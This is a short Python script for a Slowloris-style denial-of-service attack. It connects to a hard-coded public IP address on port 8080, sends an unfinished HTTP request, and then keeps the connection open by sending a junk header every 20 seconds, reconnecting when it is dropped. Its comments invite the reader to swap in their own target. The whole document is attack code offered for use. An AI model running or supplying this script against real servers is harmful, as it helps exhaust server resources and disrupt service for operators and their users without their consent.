#!/usr/bin/env python
import socket
import time

url = "197.248.61.217" # replace with your target
port = 8080 # replace with your port
timeout = 10 # replace with your timeout
socket.setdefaulttimeout(timeout)

# Create a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# Connect to the server
s.connect((url, port))

# Send an initial GET request
s.send(("GET / HTTP/1.1\r\nHost: " + url + "\r\n\r\n").encode())

# Infinite loop to keep sending headers
while True:
    try:
        s.send("X-a: b\r\n".encode())
        time.sleep(20) # Sleep for 1
    except ConnectionAbortedError:
        print('ConnectionAbortedError: [WinError 10053] An established connection was aborted by the software in your host machine')
        s.close()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((url, port))
        s.send(("GET / HTTP/1.1\r\nHost: " + url + "\r\n\r\n").encode())
        continue
    except Exception as e:
        print("Exception occurred: ", e)
        s.close()
        break
    else:
        print('Packet successfully sent')